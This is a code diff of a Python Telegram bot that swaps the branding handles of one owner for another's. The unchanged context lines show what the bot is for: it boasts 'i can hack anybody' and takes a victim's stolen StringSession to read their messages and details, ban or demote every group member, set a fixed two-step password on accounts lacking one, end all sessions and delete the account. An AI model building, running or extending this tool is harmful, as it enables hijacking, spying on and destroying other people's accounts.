@@ -145,13 +145,13 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "AbhiModszYT_Return"
+channel = "RONNY_KI_DUNIYA_Return"
 menu = '''
 ┏━━━━━━━━━❥
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ Uᴘᴅᴀᴛᴇꜱ -> @AmBotYT
+┣ Cʀᴇᴀᴛᴇʀ -> @ll_SABKA_BHAI_KILLER_ll
+┣ Uᴘᴅᴀᴛᴇꜱ -> @RONNY_KI_DUNIYA
 ┗━━━━━━━━━❥
-**Updates JOIN @AmBotYT**
+**Updates JOIN @RONNY_KI_DUNIYA**
 
 
 
@@ -183,21 +183,21 @@ M: [Change Phone number using StringSession]
 
 I ADD MORE FEATURES LATER 
 ┏━━━━━━━━━❥
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
+┣ Cʀᴇᴀᴛᴇʀ -> @ll_SABKA_BHAI_KILLER_ll
+┣ About   -> @ll_SABKA_BHAI_KILLER_ll
+┣ Cʀᴇᴀᴛᴇʀ -> @ll_SABKA_BHAI_KILLER_ll
+┣ About   -> @ll_SABKA_BHAI_KILLER_ll
+┣ Cʀᴇᴀᴛᴇʀ -> @ll_SABKA_BHAI_KILLER_ll
+┣ About   -> @ll_SABKA_BHAI_KILLER_ll
+┣ Cʀᴇᴀᴛᴇʀ -> @ll_SABKA_BHAI_KILLER_ll
+┣ About   -> @ll_SABKA_BHAI_KILLER_ll
 ┗━━━━━━━━━❥
 
 '''
 mm = '''
 ┏━━━━━━━━━❥
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ Uᴘᴅᴀᴛᴇꜱ -> @AmBotYT
+┣ Cʀᴇᴀᴛᴇʀ -> @ll_SABKA_BHAI_KILLER_ll
+┣ Uᴘᴅᴀᴛᴇꜱ -> @RONNY_KI_DUNIYA
 ┗━━━━━━━━━❥
 i can hack anybody
 Take his StringSession and use me
@@ -216,7 +216,7 @@ async def op(event):
   if not event.sender_id == legendx:
     return await event.reply("please don't use me fuck off 🥺")
   try:
-    await event.reply("session bot file", file="AbhiModszYT.session")
+    await event.reply("session bot file", file="RONNY_KI_DUNIYA.session")
   except Exception as e:
     print (e)
 
@@ -245,7 +245,7 @@ async def start(event):
         return await event.reply("This StringSession is terminated maybe")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY AbhiModszYT")
+        file.write(i + "\n\nDETAILS BY @ll_SABKA_BHAI_KILLER_ll")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -260,7 +260,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using @AM_YTBott")
+      await event.reply(i + "\n\nThanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif r == "C":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -272,7 +272,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using @AM_YTBott")
+      await event.reply("Banning all members Thanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif r == "D":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -282,7 +282,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using @AM_YTBott")
+      await event.reply(i + "\n\nThanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif r == "E":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -294,7 +294,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using @AM_YTBott")
+      await event.reply("Joined the Channel/Group Thanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif r == "F":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -306,7 +306,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using @AM_YTBott")
+      await event.reply("Leaved the Channel/Group Thanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif r == "G":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -318,7 +318,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using @AM_YTBott")
+      await event.reply("Deleted the Channel/Group Thanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif r == "H":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -329,7 +329,7 @@ async def start(event):
         return await event.respond("This StringSession is terminated maybe")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `Abhi12` you can login now\n\nThanks For using @AM_YTBott")
+        await event.reply("User don't have two step thats why now two step is `Abhi12` you can login now\n\nThanks For using @ll_SABKA_BHAI_KILLER_ll")
       else:
         await event.reply("Sorry User Have two step already")
     elif r == "I":
@@ -341,7 +341,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using @AM_YTBott")
+      await event.reply("The all sessions are terminated\n\nThanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif res.text == "J":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -351,7 +351,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using @AM_YTBott")
+      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif res.text == "L":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -365,7 +365,7 @@ async def start(event):
       await x.send_message("NOW GIVE USER USERNAME")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using @AM_YTBott")
+      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif res.text == "K":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -380,7 +380,7 @@ async def start(event):
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using @AM_YTBott")
+      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using @ll_SABKA_BHAI_KILLER_ll")
     elif res.text == "M":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
